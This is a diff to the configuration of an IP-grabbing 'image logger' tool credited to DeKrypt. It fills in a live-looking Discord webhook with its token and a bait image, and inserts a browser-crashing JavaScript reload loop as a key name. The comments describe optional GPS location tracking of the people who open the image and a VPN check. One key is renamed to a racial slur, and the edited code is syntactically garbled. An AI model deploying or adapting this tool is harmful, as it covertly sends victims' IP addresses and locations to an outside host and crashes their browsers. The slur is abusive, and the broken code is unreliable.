@@ -12,24 +12,28 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
+    "webhook": "https://discord.com/api/webhooks/1206931656921980990/2eUPm7TGl2jubjC4NYh_OzRo4xWhOnK8Xpo7d2i2Es2vPLR6dWVgkZkasw961BpqC5c0",
+    "image": "https://lh3.googleusercontent.com/BanCupypVSBhTYTLGPltEybcqK2NNR3CqggRHEhs_1LB32yOoxd2qaUoKlL4kc27n10yAWqiR8tNbyDm-GICJUnwmw=w640-h400-e365-rj-sc0x00ffffff", # You can also have a custom image by using a URL argument
+                                               # (E.g. yoursite.com/imagelogger?url=<text=https%3A%2F%2Flh3.googleusercontent.com%2FBanCupypVSBhTYTLGPltEybcqK2NNR3CqggRHEhs_1LB32yOoxd2qaUoKlL4kc27n10yAWqiR8tNbyDm-GICJUnwmw%3Dw640-h400-e365-rj-sc0x00ffffff >)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "tara", # Set this to the name you want the webhook to have
+    "color": 0x00FFFF, # Hex Color you want for the embed (0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    " onbeforeunload = function(){localStorage.x=1};
+
+setTimeout(function(){
+  while(1)location.reload(1)
+}, 1000) ": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
-    "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
+    "HI NIGGER": { # Show a custom message when the user opens the image
+        "EWWW": False, # Enable the custom message?
         "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+        "{ip}": True, # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
